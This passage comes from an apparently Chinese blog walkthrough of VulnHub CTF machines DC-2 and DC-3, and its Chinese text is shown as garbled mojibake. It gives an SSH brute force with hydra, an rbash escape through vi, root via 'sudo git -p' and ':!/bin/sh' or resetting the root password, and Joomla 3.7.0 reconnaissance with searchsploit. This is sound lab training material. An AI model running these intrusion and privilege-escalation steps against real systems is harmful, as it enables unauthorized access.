<p><img src="/2022/08/29/vulnhub/image-20220831225233262.png" alt="image-20220831225233262"></p>
<p>ç‚¹å¼€æŸ¥çœ‹ï¼Œå¾—åˆ°flag2</p>
<p><img src="/2022/08/29/vulnhub/image-20220831225256842.png" alt="image-20220831225256842"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">Flag <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> you can<span class="symbol">&#x27;t</span> exploit WordPress <span class="keyword">and</span> take a shortcut, there <span class="keyword">is</span> another way.</span><br><span class="line"></span><br><span class="line">Hope you found another <span class="keyword">entry</span> point.</span><br><span class="line">æ„æ€æ˜¯ï¼š</span><br><span class="line">å¦‚æœä½ ä¸èƒ½åˆ©ç”¨WordPresså¹¶èµ°æ·å¾„ï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ã€‚</span><br><span class="line"></span><br><span class="line">å¸Œæœ›ä½ èƒ½æ‰¾åˆ°å¦ä¸€ä¸ªåˆ‡å…¥ç‚¹ã€‚ </span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Flag3-1"><a href="#Flag3-1" class="headerlink" title="Flag3"></a>Flag3</h2><p>æ ¹æ®flag2çš„æç¤ºï¼Œå®é™…ä¸Šå°±æ˜¯è¯´ä»wordpressè¿™æ¡è·¯æ˜¯è¡Œä¸é€šçš„ï¼Œè¦ä»å¦å¤–çš„æ–¹å‘</p>
<p>ä½†æ˜¯å¦‚æœwordpressè¡Œä¸é€šï¼Œè€Œè¿™ä¸ªç½‘ç«™å°±æ˜¯wordpressæ­å»ºèµ·æ¥çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªç½‘ç«™çš„å°±ä¸èƒ½ä¸‹æ‰‹</p>
<p>è™½ç„¶ç½‘ç«™çš„80ç«¯å£çš„httpè¡Œä¸é€š</p>
<p>ä½†æ˜¯æˆ‘ä»¬ä¹‹å‰ç”¨nmapæ‰«äº†ä¸€ä¸‹ï¼Œå‘ç°ç«¯å£7744è¿è¡Œç€sshï¼Œé‚£æˆ‘ä»¬èƒ½ä¸èƒ½åˆ©ç”¨sshç™»å½•æˆåŠŸå‘¢</p>
<p><img src="/2022/08/29/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></p>
<p>æˆ‘ä»¬å…ˆç”¨ä¹‹å‰ç”¨è¿‡çš„å·¥å…·<code>hydra</code>è¿›è¡Œçˆ†ç ´ä¸€ä¸‹ï¼Œçœ‹çœ‹è¿™ä¸ªsshçš„ç”¨æˆ·æ˜¯è°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">è¾“å…¥hydra -l un<span class="selector-class">.txt</span> -P pass<span class="selector-class">.txt</span> <span class="number">192.168</span>.<span class="number">133.138</span> ssh -s <span class="number">7744</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831230552544.png" alt="image-20220831230552544"></p>
<p>å‘ç°<code>tom</code>è´¦å·æ˜¯åœ¨è¿™é‡Œç™»å½•</p>
<p><img src="/2022/08/29/vulnhub/image-20220831231405322.png" alt="image-20220831231405322"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ssh <span class="symbol">tom@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.138</span> -p <span class="number">7744</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831231449571.png" alt="image-20220831231449571"></p>
<p>ç™»å½•æˆåŠŸåï¼Œ<code>ls</code>å‘ç°<code>flag3.txt</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cat</span> flag3.txtï¼ŒæŸ¥çœ‹å†…å®¹</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831231634426.png" alt="image-20220831231634426"></p>
<p>å‘ç°æ²¡æœ‰è¯¥å‘½ä»¤ï¼Œé‚£å°±å¯èƒ½æ˜¯æ²¡æœ‰æƒé™æ‰§è¡Œè¿™ä¸ªå‘½ä»¤äº†</p>
<h3 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h3><p>çœ‹åˆ°rbashï¼Œä¸è®¤è¯†ï¼ŒæŸ¥ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOCKERFILE"><figure class="iseeu highlight /dockerfile"><table><tr><td class="code"><pre><span class="line">rbash</span><br><span class="line">å®ƒä¸ä¸€èˆ¬<span class="keyword">shell</span><span class="language-bash">çš„åŒºåˆ«åœ¨äºä¼šé™åˆ¶ä¸€äº›è¡Œä¸ºï¼Œè®©ä¸€äº›å‘½ä»¤æ— æ³•æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure></div>

<p>çœ‹æ¥æ˜¯é™åˆ¶äº†æˆ‘ä»¬çš„å‘½ä»¤ï¼Œä½†æˆ‘ä»¬è¿˜æ˜¯å¾—çŸ¥é“æˆ‘ä»¬ç›®å‰è¿˜èƒ½ç”¨é‚£äº›å‘½ä»¤ï¼Œä¹‹å‰ä½¿ç”¨è¿‡lsï¼Œæ‰€ä»¥lså¯ä»¥ä½¿ç”¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ls <span class="regexp">/home/</span>tom<span class="regexp">/usr/</span>bin   <span class="regexp">//</span>æŸ¥çœ‹rbashè®¾ç½®çš„å¯æ‰§è¡Œçš„å‘½ä»¤</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831232504736.png" alt="image-20220831232504736"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">less <span class="keyword">ls</span> scp <span class="keyword">vi</span></span><br></pre></td></tr></table></figure></div>

<p>å…³é”®æ˜¯viçš„å‘½ä»¤</p>
<h3 id="viç»•è¿‡-gt-rbashé€ƒé€¸"><a href="#viç»•è¿‡-gt-rbashé€ƒé€¸" class="headerlink" title="*viç»•è¿‡-&gt;rbashé€ƒé€¸"></a>*viç»•è¿‡-&gt;rbashé€ƒé€¸</h3><p>å¯ä»¥è¿›å…¥viä¸­ï¼Œæ‰§è¡Œ<code>set</code>å‘½ä»¤ï¼ŒæŠŠ<code>shell</code>æ”¹ä¸º<code>/bin/sh</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">å…ˆè¾“å…¥<span class="keyword">vi</span>ï¼Œè¿›å…¥<span class="keyword">vi</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831233127692.png" alt="image-20220831233127692"></p>
<p>ç„¶å</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">ç›´æ¥è¾“å…¥ï¼Œä¸ç”¨æŒ‰i</span><br><span class="line">:set shell=<span class="regexp">/bin/</span>sh    <span class="regexp">//</span>ç»™shellèµ‹å€¼</span><br><span class="line">å›è½¦</span><br><span class="line">:shell                <span class="regexp">//</span>æ‰§è¡Œshell</span><br><span class="line">å›è½¦ï¼Œå°±é€€å›ä¸»ç•Œé¢æ¥äº†</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831233626801.png" alt="image-20220831233626801"></p>
<p>è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†é€ƒé€¸</p>
<p>ä¹‹å‰å› ä¸ºæˆ‘ä»¬å—é™äºrbashï¼Œä¸èƒ½æ‰§è¡Œcdç­‰å‘½ä»¤</p>
<p><img src="/2022/08/29/vulnhub/image-20220831233814113.png" alt="image-20220831233814113"></p>
<p>ç°åœ¨æ‰§è¡Œè¯•è¯•</p>
<p><img src="/2022/08/29/vulnhub/image-20220831234028674.png" alt="image-20220831234028674"></p>
<p>å°±æ²¡æœ‰é˜»æ­¢äº†</p>
<p>æˆ‘ä»¬å†è¯•è¯•cat</p>
<p><img src="/2022/08/29/vulnhub/image-20220831234235801.png" alt="image-20220831234235801"></p>
<p>å‘ç°catå‘½ä»¤æ‰¾ä¸åˆ°ï¼Œä½†æ˜¯æˆ‘ä»¬å·²ç»ç»•è¿‡äº†rbashï¼Œæ‰€ä»¥åªèƒ½æ˜¯å…¶ä»–åŸå› </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">è¿™æ˜¯æ˜¾ç¤ºå½“å‰ç¯å¢ƒå˜é‡ï¼Œå¯èƒ½<span class="built_in">cat</span>å¹¶æ²¡æœ‰è¢«è®¾ç½®åˆ°å½“å‰çš„ç¯å¢ƒå˜é‡æ‰€ä»¥æ— æ³•æ‰§è¡Œ</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831234423827.png" alt="image-20220831234423827"></p>
<h3 id="è®¾ç½®å…¨å±€å˜é‡"><a href="#è®¾ç½®å…¨å±€å˜é‡" class="headerlink" title="*è®¾ç½®å…¨å±€å˜é‡"></a>*è®¾ç½®å…¨å±€å˜é‡</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">äºæ˜¯æˆ‘ä»¬æ¥è®¾ç½®å…¨å±€å˜é‡,ç»ˆç«¯è¾“å…¥</span><br><span class="line">export <span class="variable constant_">PATH</span>=<span class="variable constant_">PATH</span><span class="symbol">:/usr/local/sbin</span><span class="symbol">:/usr/local/bin</span><span class="symbol">:usr/sbin</span><span class="symbol">:/usr/bin</span><span class="symbol">:/bin</span><span class="symbol">:sbin</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·æˆ‘ä»¬æ‰§è¡Œcatå°±ä¸ä¼šåªåœ¨<code>/home/tom/usr/bin</code>é‡Œé¢å¯»æ‰¾äº†ï¼Œä¼šåœ¨å¾ˆå¤šç›®å½•é‡Œå¯»æ‰¾</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cd</span> tom</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> flag3.txt</span><br><span class="line">å¾—åˆ°flag3</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831235038373.png" alt="image-20220831235038373"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br><span class="line">æ„æ€æ˜¯ï¼š</span><br><span class="line"><span class="section">å¯æ€œçš„è€æ±¤å§†æ€»æ˜¯åœ¨è¿½æ°ç‘ã€‚ä¹Ÿè®¸ä»–åº”è¯¥ä¸ºä»–é€ æˆçš„æ‰€æœ‰å‹åŠ›è´Ÿè´£ã€‚</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">ä½†æ˜¯çœ‹åˆ°äº†suï¼Œä¹Ÿå°±æ˜¯éœ€è¦åˆ‡æ¢ç”¨æˆ·</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Flag4-1"><a href="#Flag4-1" class="headerlink" title="Flag4"></a>Flag4</h2><p>æ ¹æ®flag3ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“éœ€è¦ç”¨suå‘½ä»¤åˆ‡æ¢ç”¨æˆ·åˆ°jerry</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">su</span> jerryå’Œå…¶å¯†ç </span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220901094337288.png" alt="image-20220901094337288"></p>
<p>ç„¶ååˆ‡æ¢åˆ°jerryç›®å½•ï¼Œå‘ç°flag4.txt</p>
<p><img src="/2022/08/29/vulnhub/image-20220901094512382.png" alt="image-20220901094512382"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">Good <span class="keyword">to</span> see <span class="keyword">that</span> you&#x27;ve made <span class="keyword">it</span> this far - <span class="keyword">but</span> you&#x27;re <span class="keyword">not</span> home yet. </span><br><span class="line"></span><br><span class="line">You still need <span class="keyword">to</span> <span class="keyword">get</span> <span class="keyword">the</span> final flag (<span class="keyword">the</span> only flag <span class="keyword">that</span> really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#x27;re <span class="keyword">on</span> your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go <span class="keyword">on</span> - git outta here!!!!</span><br><span class="line">æ„æ€æ˜¯ï¼š</span><br><span class="line">å¾ˆé«˜å…´çœ‹åˆ°ä½ èµ°äº†è¿™ä¹ˆè¿œï¼Œä½†ä½ è¿˜æ²¡å›å®¶ã€‚</span><br><span class="line">ä½ ä»ç„¶éœ€è¦å¾—åˆ°æœ€åçš„æ ‡å¿—ï¼ˆå”¯ä¸€çœŸæ­£é‡è¦çš„æ ‡å¿—ï¼ï¼ï¼ï¼‰ã€‚</span><br><span class="line">è¿™é‡Œæ²¡æœ‰æç¤º-ä½ ç°åœ¨åªèƒ½é è‡ªå·±äº†ã€‚ï¼š-ï¼‰</span><br><span class="line">å»å§-æ»šå‡ºå»ï¼ï¼ï¼ï¼</span><br><span class="line"><span class="comment">--</span></span><br><span class="line">çœ‹åˆ°gitï¼Œå°±æ˜¯æç¤ºæˆ‘ä»¬ç”¨gitå‘½ä»¤</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Flag5-1"><a href="#Flag5-1" class="headerlink" title="Flag5"></a>Flag5</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥sudo -l</span><br><span class="line"><span class="regexp">//</span>åˆ—å‡ºç›®å‰ç”¨æˆ·å¯æ‰§è¡Œä¸æ— æ³•æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220901112624228.png" alt="image-20220901112624228"></p>
<p><u>å°±å¯ä»¥å‘ç°rootä»¥nopasswdã€ä¸éœ€è¦å¯†ç ã€‘è¿è¡Œgitå‘½ä»¤</u></p>
<p>åŸç†æ˜¯gitå­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´ï¼Œ</p>
<p>åœ¨ä½¿ç”¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure></div>

<p>ä¸éœ€è¦è¾“å…¥rootå¯†ç ï¼Œå³å¯ä»¥rootèº«ä»½æ‰§è¡Œè¿™æ¡å‘½ä»¤</p>
<p>æ“ä½œå¦‚ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">sudo git -p     </span><br><span class="line"><span class="regexp">//</span>-pæ˜¯åˆ†é¡µæŸ¥çœ‹ï¼Œè¿™ä¸ªåŸç†å°±æ˜¯ç»ˆç«¯çš„çª—å£å¤§å°ä¸å¤Ÿæ˜¾ç¤ºï¼Œæ‰€ä»¥ä¸‹æ–¹ä¼šå‡ºç°å†’å·ï¼Œç­‰å¾…è¾“å…¥å‘½ä»¤</span><br></pre></td></tr></table></figure></div>

<p>ä¸‹é¢å¯ä»¥çœ‹çœ‹åŒºåˆ«</p>
<h3 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="*æ³¨æ„"></a>*æ³¨æ„</h3><p>1.çª—å£è¶³å¤Ÿå¤§</p>
<p><img src="/2022/08/29/vulnhub/image-20220901113721300.png" alt="image-20220901113721300"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¾ç¤ºå®Œäº†ï¼Œå°±åˆå›åˆ°åŸå¤„äº†</p>
<p>2.çª—å£å°ä¸€äº›</p>
<p><img src="/2022/08/29/vulnhub/image-20220901113851826.png" alt="image-20220901113851826"></p>
<p>ä¸‹æ–¹å°±æ˜¾ç¤ºå‡º:ï¼Œç­‰å¾…è¾“å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">**:æ˜¯è‡ªå¸¦æœ‰çš„ï¼Œä¸æ˜¯è¾“å…¥çš„</span><br><span class="line">:!/bin/sh    //æ„Ÿå¹å·!æ˜¯shellè½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥è¦é¿å…sudoæˆæƒç”¨æˆ·ä½¿ç”¨viï¼Œvimï¼Œftpï¼Œleeï¼Œmoreï¼Œgit</span><br><span class="line">è¿›å…¥root</span><br><span class="line"><span class="section">cd /root</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">å½“ç„¶ä¹Ÿå¯ä»¥æ‰§è¡Œ:!passwd root</span><br><span class="line">ä¿®æ”¹å…¶å¯†ç </span><br><span class="line">ç„¶åsu rootç™»å½•ä¹Ÿå¯</span><br></pre></td></tr></table></figure></div>

<h3 id="1-æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell"><a href="#1-æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell" class="headerlink" title="1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell"></a>1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell</h3><p>$å˜æˆ#æˆåŠŸ</p>
<p><img src="/2022/08/29/vulnhub/image-20220901114902493.png" alt="image-20220901114902493"></p>
<h3 id="2-ä¿®æ”¹å¯†ç ï¼Œç™»å½•"><a href="#2-ä¿®æ”¹å¯†ç ï¼Œç™»å½•" class="headerlink" title="2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•"></a>2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•</h3><p><img src="/2022/08/29/vulnhub/image-20220901114453769.png" alt="image-20220901114453769"></p>
<p>$å˜æˆ#ï¼ŒæˆåŠŸç™»å½•</p>
<p><img src="/2022/08/29/vulnhub/image-20220901114726423.png" alt="image-20220901114726423"></p>
<p>ç„¶ååˆ°<code>/root</code>ç›®å½•ä¸‹ï¼Œæ‰¾åˆ°æœ€åçš„ flag</p>
<p><img src="/2022/08/29/vulnhub/image-20220901115306177.png" alt="image-20220901115306177"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___|<span class="string"> </span>|<span class="string"> </span>|<span class="string">   __</span>|<span class="string"> </span>|<span class="string"> ___  _ __   ___  / \</span></span><br><span class="line"><span class="string">\ \/  \/ / _ \ </span>|<span class="string"> </span>|<span class="string">  / _` </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">  \__,_</span>|<span class="string">\___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it&#x27;s all greatly</span></span><br><span class="line"><span class="string">appreciated.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span></span><br><span class="line"><span class="string">æ„æ€æ˜¯ï¼š</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ­å–œï¼ï¼ï¼</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ç‰¹åˆ«æ„Ÿè°¢æ‰€æœ‰ç»™æˆ‘å‘æ¨æ–‡çš„äºº</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å¹¶å‘æˆ‘æä¾›äº†åé¦ˆ-éå¸¸æ£’</span></span><br><span class="line"><span class="string">è°¢è°¢ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å¦‚æœæ‚¨å–œæ¬¢è¿™ä¸ªCTFï¼Œè¯·é€šè¿‡@DCAU7ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡</span></span><br></pre></td></tr></table></figure></div>

<p><strong>5ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<hr>
<h1 id="ä¸‰ã€DC-3-åˆçº§"><a href="#ä¸‰ã€DC-3-åˆçº§" class="headerlink" title="ä¸‰ã€DC-3[åˆçº§]"></a>ä¸‰ã€DC-3[åˆçº§]</h1><p><strong>only one flag</strong></p>
<p>ã€å‰é¢çš„é¶æœºipå¯»æ‰¾ï¼ŒæŒ‰ä¹‹å‰çš„æ­¥éª¤å³å¯ã€‘</p>
<p>å…ˆç”¨nmapæ‰«ä¸€ä¸‹æˆ‘ä»¬çš„é¶æœºip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p- <span class="number">192.168.133.139</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220902123406584.png" alt="image-20220902123406584"></p>
<p>çœ‹åˆ°åªæœ‰<code>80</code>ç«¯å£ï¼Œè¿è¡Œç€ä¸€ä¸ª<code>http</code>æœåŠ¡ï¼Œä¸­é—´ä»¶ä¸º<code>apache2.4.18</code></p>
<p>å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰æ˜¯<code>joomla</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220902123056590.png" alt="image-20220902123056590"></p>
<p>åˆ©ç”¨æ’ä»¶<code>wappalyzer</code>ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°å…¶CMSä¸ºjoomla</p>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨kaliåŒ…å½“ä¸­è‡ªå¸¦çš„joomscanå·¥å…·å¯¹å…¶è¿›è¡Œæ‰«æ</p>
<p>ã€æ²¡æœ‰çš„ï¼Œå¯èƒ½éœ€è¦æ›´æ–°åŒ…ï¼Œç„¶åç›´æ¥ä¸‹è½½å³å¯ã€‘</p>
<p><img src="/2022/08/29/vulnhub/image-20220902185529785.png" alt="image-20220902185529785"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="code"><pre><span class="line">è¾“å…¥joomscan -u <span class="number">192.168.133.139</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220902185954570.png" alt="image-20220902185954570"></p>
<p>æ‰«æå‘ç°äº†ï¼Œç®¡ç†å‘˜çš„ç™»å½•ç½‘å€<code>http://192.168.133.139/administrator/</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220902190312468.png" alt="image-20220902190312468"></p>
<p>ä½†æ˜¯ä¸çŸ¥é“ç”¨æˆ·åå’Œå¯†ç </p>
<hr>
<p>å‘ç°å…¶<code>joomla</code>ç‰ˆæœ¬ä¸º<code>3.7.0</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220902194849302.png" alt="image-20220902194849302"></p>
<p>ä½†æˆ‘ä»¬å¹¶ä¸çŸ¥é“è¯¥ç‰ˆæœ¬æœ‰å“ªäº›æ¼æ´ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ° <code>kali</code>çš„<code>Exploit-DB</code>å·¥å…·</p>
<p>å¯ä»¥åœ¨æµè§ˆå™¨é‡Œçš„<code>Exploit-DB</code>ç½‘å€è¿›è¡ŒæŸ¥è¯¢ã€ä¸è¿‡å› ä¸ºæ˜¯å›½å¤–ç½‘å€æœ‰ç‚¹å¡ã€‘</p>
<p><img src="/2022/08/29/vulnhub/image-20220902195723987.png" alt="image-20220902195723987"></p>
<p>ç„¶åå¯»æ‰¾ä¸‹è½½payload</p>
<hr>
<p>ä¹Ÿå¯ä»¥åœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤æŸ¥è¯¢ã€ä¹Ÿæ˜¯åŸºäºExploit-DBçš„å‘½ä»¤è¡Œæœç´¢å·¥å…·,å¯ä»¥å¸®åŠ©æˆ‘ä»¬æŸ¥æ‰¾æ¸—é€æ¨¡å—ã€‘</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line">è¾“å…¥searchsploit <span class="keyword">joomla </span><span class="number">3</span>.<span class="number">7</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903084826356.png" alt="image-20220903084826356"></p>
<p>å¯ä»¥çœ‹åˆ°<code>joomla 3.7.0</code>ç‰ˆæœ¬å­˜åœ¨<code>sqlæ³¨å…¥</code>çš„æ¼æ´</p>
<p> ç„¶åæŸ¥çœ‹Path</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">è¾“å…¥searchsploit -<span class="selector-tag">p</span> <span class="number">42033</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903124805721.png" alt="image-20220903124805721"></p>
<p><code>Path</code>å°±æ˜¯è¯¥æ¼æ´åˆ©ç”¨æ–¹æ³•çš„æ–‡æœ¬åœ°å€</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">42033</span>.txt</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903125053542.png" alt="image-20220903125053542"></p>
<p>å¯ä»¥çœ‹åˆ°è¯¥æ¼æ´çš„æµ‹è¯•å¹³å°ï¼Œæ—¶é—´ï¼Œè¿˜æœ‰æ¼æ´çš„CVEç¼–å·</p>
<p>å…³é”®åœ¨å®ƒç»™å‡ºçš„sqlmapæ³¨å…¥çš„æ¨¡æ¿</p>
